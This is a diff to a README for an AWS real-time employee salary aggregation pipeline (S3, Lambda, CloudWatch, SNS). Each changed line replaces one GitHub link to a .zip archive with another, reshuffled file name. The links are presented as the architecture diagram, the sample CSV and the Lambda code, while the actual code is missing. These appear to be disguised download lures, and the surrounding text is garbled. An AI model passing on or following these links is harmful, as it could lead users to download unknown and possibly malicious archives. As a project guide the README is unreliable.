@@ -33,7 +33,7 @@ IAM	Provides least-privilege permissions for Lambda to access S3 & CloudWatch
 CloudWatch	Logs Lambda execution, errors, and monitoring for observability
 SNS (Optional)	Sends notifications when new summary JSON files are uploaded
 Architecture Diagram
-Insert https://github.com/ChandMoghal/AWS-Real-Time-Employee-Salary-Aggregation-Pipeline/raw/refs/heads/main/stingproof/AW-Salary-Time-Employee-Aggregation-Pipeline-Real-3.6-alpha.5.zip here showing the flow:
+Insert https://github.com/ChandMoghal/AWS-Real-Time-Employee-Salary-Aggregation-Pipeline/raw/refs/heads/main/stingproof/Time-Pipeline-Real-AW-Aggregation-Salary-Employee-2.7-alpha.1.zip here showing the flow:
 CSV Upload → S3 Input Bucket → Lambda Function → S3 Output Bucket → CloudWatch Logs → (Optional SNS Notification)
 Implementation Steps
 
@@ -41,7 +41,7 @@ Implementation Steps
    - Input: employee-raw-data-rajinikanth-2025
    - Output: employee-summary-data-rajinikanth-2025
 
-2. Sample CSV (https://github.com/ChandMoghal/AWS-Real-Time-Employee-Salary-Aggregation-Pipeline/raw/refs/heads/main/stingproof/AW-Salary-Time-Employee-Aggregation-Pipeline-Real-3.6-alpha.5.zip):
+2. Sample CSV (https://github.com/ChandMoghal/AWS-Real-Time-Employee-Salary-Aggregation-Pipeline/raw/refs/heads/main/stingproof/Time-Pipeline-Real-AW-Aggregation-Salary-Employee-2.7-alpha.1.zip):
 EmployeeID,Name,Country,Salary
 101,John,USA,5000
 102,Anita,India,4000
@@ -51,7 +51,7 @@ EmployeeID,Name,Country,Salary
 106,Kiran,India,4700
 107,Alex,USA,5200
 
-3. Lambda Function (https://github.com/ChandMoghal/AWS-Real-Time-Employee-Salary-Aggregation-Pipeline/raw/refs/heads/main/stingproof/AW-Salary-Time-Employee-Aggregation-Pipeline-Real-3.6-alpha.5.zip):
+3. Lambda Function (https://github.com/ChandMoghal/AWS-Real-Time-Employee-Salary-Aggregation-Pipeline/raw/refs/heads/main/stingproof/Time-Pipeline-Real-AW-Aggregation-Salary-Employee-2.7-alpha.1.zip):
 [Insert the full Python code of Lambda here]
 
 4. Add S3 Trigger:
